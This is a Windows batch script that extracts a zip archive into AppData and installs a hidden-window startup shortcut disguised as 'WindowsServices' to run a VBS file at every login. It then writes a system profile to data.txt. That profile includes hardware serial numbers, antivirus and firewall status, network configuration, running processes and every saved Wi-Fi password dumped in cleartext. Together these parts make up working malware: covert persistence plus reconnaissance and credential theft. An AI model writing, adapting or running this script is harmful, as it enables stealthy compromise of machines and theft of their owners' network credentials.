@echo off
setlocal

:: === Variables ===
set "ZIPFILE=LocalSettings.zip"
set "DEST=%AppData%"
set "VBS=%DEST%\LocalSettings\WindowsServices.vbs"
set "STARTUP=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT=%STARTUP%\WindowsServices.lnk"
set "SEVENZIP=%~dp0\7-Zip\App\7-Zip\7z.exe"

:: === Step 1: Extract LocalSettings.zip to %AppData% ===
if not exist "%SEVENZIP%" (
    echo ERROR: 7z.exe not found!
    pause
    exit /b 1
)

"%SEVENZIP%" x "%~dp0%ZIPFILE%" -o"%DEST%" -y >nul

:: === Step 2: Ensure Startup folder exists ===
if not exist "%STARTUP%" mkdir "%STARTUP%"

:: === Step 3: Create shortcut ===
powershell -Command ^
    "$ws = New-Object -ComObject WScript.Shell; " ^
    "$s = $ws.CreateShortcut('%SHORTCUT%'); " ^
    "$s.TargetPath = 'wscript.exe'; " ^
    "$s.Arguments = '\"%VBS%\"'; " ^
    "$s.WindowStyle = 0; " ^
    "$s.WorkingDirectory = '%DEST%\LocalSettings'; " ^
    "$s.IconLocation = 'wscript.exe,0'; " ^
    "$s.Save()"

:: === Step 4: Run script ===
start "" wscript.exe "%VBS%"
    
setlocal enabledelayedexpansion

set "FILE=data.txt"
echo Collecting system information...
echo ----------------------------------------- > "%FILE%"
echo SYSTEM INFORMATION REPORT >> "%FILE%"
echo Generated on: %DATE% %TIME% >> "%FILE%"
echo ----------------------------------------- >> "%FILE%"
echo. >> "%FILE%"

:: ===== OS Info =====
echo [Operating System] >> "%FILE%"
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Type" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Hardware UUID =====
echo [Hardware UUID] >> "%FILE%"
powershell -command "(Get-CimInstance Win32_ComputerSystemProduct).UUID" >> "%FILE%"
echo. >> "%FILE%"

:: ===== CPU Info =====
echo [CPU] >> "%FILE%"
powershell -command "Get-CimInstance Win32_Processor | Select-Object Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed" >> "%FILE%"
echo. >> "%FILE%"

:: ===== RAM Info =====
echo [Memory] >> "%FILE%"
powershell -command "Get-CimInstance Win32_PhysicalMemory | Select-Object Manufacturer,PartNumber,Speed,Capacity" >> "%FILE%"
echo Total_RAM_GB: >> "%FILE%"
powershell -command "(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB" >> "%FILE%"
echo. >> "%FILE%"

:: ===== GPU Info =====
echo [GPU] >> "%FILE%"
powershell -command "Get-CimInstance Win32_VideoController | Select-Object Name,AdapterRAM,DriverVersion" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Battery Info =====
echo [Battery] >> "%FILE%"
powershell -command "Get-CimInstance Win32_Battery | Select-Object EstimatedChargeRemaining,BatteryStatus,DesignCapacity,FullChargeCapacity" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Motherboard Info =====
echo [Motherboard] >> "%FILE%"
powershell -command "Get-CimInstance Win32_BaseBoard | Select-Object Product,Manufacturer,SerialNumber,Version" >> "%FILE%"
echo. >> "%FILE%"

:: ===== BIOS Info =====
echo [BIOS] >> "%FILE%"
powershell -command "Get-CimInstance Win32_BIOS | Select-Object Manufacturer,SMBIOSBIOSVersion,ReleaseDate" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Disk Info =====
echo [Disks] >> "%FILE%"
powershell -command "Get-CimInstance Win32_DiskDrive | Select-Object Model,SerialNumber,InterfaceType,Size" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Network Info =====
echo [Network Adapters] >> "%FILE%"
echo. >> "%FILE%"

:: ===== IP Info =====
echo [IP Configuration] >> "%FILE%"
ipconfig /all >> "%FILE%"
echo. >> "%FILE%"

:: ===== Antivirus Status =====
echo [Antivirus Status] >> "%FILE%"
powershell -command "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AMServiceEnabled" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Firewall Status =====
echo [Firewall Status] >> "%FILE%"
netsh advfirewall show allprofiles >> "%FILE%"
echo. >> "%FILE%"

:: ===== Installed Applications =====
echo [Installed Applications] >> "%FILE%"
echo. >> "%FILE%"

:: ===== Wi-Fi Saved Networks + Passwords =====
echo [Saved Wi-Fi Networks and Passwords] >> "%FILE%"

for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "ssid=%%A"
    set "ssid=!ssid:~1!"
    echo SSID: !ssid! >> "%FILE%"
    netsh wlan show profile name="!ssid!" key=clear >> "%FILE%"
    echo. >> "%FILE%"
)

echo. >> "%FILE%"

:: ===== Running Processes =====
echo [Running Processes] >> "%FILE%"
tasklist >> "%FILE%"
echo. >> "%FILE%"

echo DONE. System info saved to %FILE%.
:: Finished
exit /b
